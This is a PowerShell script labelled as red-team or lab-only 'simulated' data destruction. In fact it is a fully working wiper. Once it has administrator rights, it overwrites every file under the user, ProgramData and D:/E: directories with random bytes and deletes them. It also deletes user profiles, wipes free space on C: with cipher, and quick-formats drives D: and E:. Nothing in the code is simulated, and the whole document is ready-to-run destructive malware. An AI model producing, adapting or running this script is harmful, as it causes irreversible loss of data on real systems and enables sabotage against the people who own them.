# PowerShell Script for Simulated Data Destruction (Red Team / Lab Use Only)

# Confirm privilege
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) {
    Write-Error "You need to run this script as Administrator!"
    exit
}

# Overwrite files in target directories
$targets = @("C:\Users", "C:\ProgramData", "D:\", "E:\")  # add/remove as needed

foreach ($path in $targets) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Recurse -File -Force -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $file = $_.FullName
                $length = (Get-Item $file).Length
                [byte[]]$junk = New-Object byte[] $length
                (New-Object Random).NextBytes($junk)
                [System.IO.File]::WriteAllBytes($file, $junk)
                Remove-Item $file -Force
            } catch {
                Write-Warning "Failed to overwrite: $file"
            }
        }
    }
}

# Remove user profiles (carefully!)
$profiles = Get-WmiObject Win32_UserProfile | Where-Object { $_.Special -eq $false -and $_.LocalPath -ne $env:SystemDrive }
foreach ($profile in $profiles) {
    try {
        $profile.Delete()
        Write-Host "Deleted profile: $($profile.LocalPath)"
    } catch {
        Write-Warning "Could not delete profile: $($profile.LocalPath)"
    }
}

# Wipe free space using cipher
cipher /w:C

# Optional: Format non-system drives (D: and E:)
# Use extreme caution!
$drivesToFormat = @("D:", "E:")
foreach ($drive in $drivesToFormat) {
    try {
        Write-Host "Formatting $drive ..."
        format $drive /fs:NTFS /q /x /y
    } catch {
        Write-Warning "Failed to format drive $drive"
    }
}
